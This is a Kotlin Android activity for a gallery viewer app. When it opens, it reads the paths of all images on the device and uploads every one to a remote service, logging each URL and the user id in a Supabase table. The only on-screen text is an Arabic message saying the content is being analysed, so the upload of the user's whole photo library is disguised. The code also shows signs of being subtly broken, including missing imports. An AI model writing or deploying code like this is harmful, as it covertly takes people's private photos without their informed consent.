package com.example.gallerypermissionapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.net.toUri
import androidx.recyclerview.widget.GridLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.bumptech.glide.Glide
import io.github.jan.supabase.gotrue.auth
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import java.io.File

class GalleryViewerActivity : AppCompatActivity() {
    
    private lateinit var recyclerView: RecyclerView
    private lateinit var loadingLayout: LinearLayout
    private lateinit var tvProgress: TextView
    private lateinit var tvImageCount: TextView
    private lateinit var btnBack: ImageView
    
    private val imageAdapter = ImageAdapter()
    private val imageList = mutableListOf<ImageItem>()
    private val coroutineScope = CoroutineScope(Dispatchers.Main + Job())
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_gallery_viewer)
        
        initializeViews()
        setupRecyclerView()
        setupClickListeners()
        loadAndUploadImages()
    }
    
    private fun initializeViews() {
        recyclerView = findViewById(R.id.recyclerView)
        loadingLayout = findViewById(R.id.loadingLayout)
        tvProgress = findViewById(R.id.tvProgress)
        tvImageCount = findViewById(R.id.tvImageCount)
        btnBack = findViewById(R.id.btnBack)
    }
    
    private fun setupRecyclerView() {
        recyclerView.layoutManager = GridLayoutManager(this, 3)
        recyclerView.adapter = imageAdapter
    }
    
    private fun setupClickListeners() {
        btnBack.setOnClickListener {
            finish()
        }
    }
    
    private fun loadAndUploadImages() {
        if (!checkPermissions()) {
            tvProgress.text = "لا يمكن تحليل المحتوى بدون الأذونات المطلوبة"
            return
        }
        
        loadingLayout.visibility = View.VISIBLE
        recyclerView.visibility = View.GONE
        tvProgress.text = "جاري تحليل المحتوى..."
        
        coroutineScope.launch {
            try {
                val imagePaths = withContext(Dispatchers.IO) {
                    loadAllImagePaths()
                }
                
                imageList.clear()
                imageList.addAll(imagePaths.map { ImageItem(it) })
                
                withContext(Dispatchers.Main) {
                    imageAdapter.updateImages(imageList)
                    loadingLayout.visibility = View.GONE
                    recyclerView.visibility = View.VISIBLE
                    tvImageCount.text = imageList.size.toString()
                }
                
                // Start uploading
                uploadImagesInSequence()
                
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    tvProgress.text = "حدث خطأ أثناء تحليل المحتوى: ${e.message}"
                }
            }
        }
    }
    
    private suspend fun uploadImagesInSequence() {
        val user = SupabaseManager.client.auth.currentUserOrNull()

        for ((index, item) in imageList.withIndex()) {
            withContext(Dispatchers.Main) {
                item.status = ImageItem.UploadStatus.UPLOADING
                imageAdapter.notifyItemChanged(index)
            }
            
            val result = withContext(Dispatchers.IO) {
                val file = File(item.path)
                ImageUploadManager.uploadImage(contentResolver, file.toUri())
            }
            
            withContext(Dispatchers.Main) {
                if (result?.success == true && result.data?.url != null) {
                    item.status = ImageItem.UploadStatus.SUCCESS
                    // Save URL to Supabase
                    saveImageUrlToSupabase(user?.id, result.data.url)
                } else {
                    item.status = ImageItem.UploadStatus.FAILED
                }
                imageAdapter.notifyItemChanged(index)
            }
        }
    }
    
    private fun saveImageUrlToSupabase(userId: String?, imageUrl: String) {
        if (userId == null) return

        lifecycleScope.launch {
            try {
                val imageToInsert = UploadedImage(
                    imageUrl = imageUrl,
                    userId = userId
                )
                SupabaseManager.client.postgrest["uploaded_images"].insert(imageToInsert)
            } catch (e: Exception) {
                // Log error if needed
                e.printStackTrace()
            }
        }
    }
    
    private fun loadAllImagePaths(): List<String> {
        val images = mutableListOf<String>()
        
        try {
            val projection = arrayOf(
                android.provider.MediaStore.Images.Media.DATA
            )
            
            val selection = "${android.provider.MediaStore.Images.Media.MIME_TYPE} LIKE ?"
            val selectionArgs = arrayOf("image/%")
            val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"
            
            contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )?.use { cursor ->
                val dataColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
                
                while (cursor.moveToNext()) {
                    val imagePath = cursor.getString(dataColumn)
                    images.add(imagePath)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        
        return images
    }
    
    private fun checkPermissions(): Boolean {
        val permissions = mutableListOf<String>()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        }
        
        return permissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        coroutineScope.cancel()
    }
    
    @Serializable
    data class UploadedImage(
        @SerializedName("image_url") val imageUrl: String,
        @SerializedName("user_id") val userId: String
    )
    
    data class ImageItem(
        val path: String,
        var status: UploadStatus = UploadStatus.PENDING
    ) {
        enum class UploadStatus {
            PENDING,
            UPLOADING,
            SUCCESS,
            FAILED
        }
    }
    
    inner class ImageAdapter : RecyclerView.Adapter<ImageAdapter.ImageViewHolder>() {
        
        private val images = mutableListOf<ImageItem>()
        
        fun updateImages(newImages: List<ImageItem>) {
            images.clear()
            images.addAll(newImages)
            notifyDataSetChanged()
        }
        
        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ImageViewHolder {
            val view = LayoutInflater.from(parent.context)
                .inflate(R.layout.item_image, parent, false)
            return ImageViewHolder(view)
        }
        
        override fun onBindViewHolder(holder: ImageViewHolder, position: Int) {
            holder.bind(images[position])
        }
        
        override fun getItemCount(): Int = images.size
        
        inner class ImageViewHolder(itemView: View) : RecyclerView.ViewHolder(itemView) {
            private val imageView: ImageView = itemView.findViewById(R.id.imgItem)
            private val statusIndicator: View = itemView.findViewById(R.id.statusIndicator)
            private val progressBar: ProgressBar = itemView.findViewById(R.id.progressBar)
            
            fun bind(item: ImageItem) {
                Glide.with(itemView.context)
                    .load(item.path)
                    .placeholder(R.drawable.ic_image_placeholder)
                    .error(R.drawable.ic_image_placeholder)
                    .centerCrop()
                    .into(imageView)
                
                when (item.status) {
                    ImageItem.UploadStatus.PENDING -> {
                        progressBar.visibility = View.GONE
                        statusIndicator.visibility = View.GONE
                    }
                    ImageItem.UploadStatus.UPLOADING -> {
                        progressBar.visibility = View.VISIBLE
                        statusIndicator.visibility = View.GONE
                    }
                    ImageItem.UploadStatus.SUCCESS -> {
                        progressBar.visibility = View.GONE
                        statusIndicator.visibility = View.VISIBLE
                        statusIndicator.setBackgroundColor(ContextCompat.getColor(itemView.context, android.R.color.holo_green_dark))
                    }
                    ImageItem.UploadStatus.FAILED -> {
                        progressBar.visibility = View.GONE
                        statusIndicator.visibility = View.VISIBLE
                        statusIndicator.setBackgroundColor(ContextCompat.getColor(itemView.context, android.R.color.holo_red_dark))
                    }
                }
            }
        }
    }
} 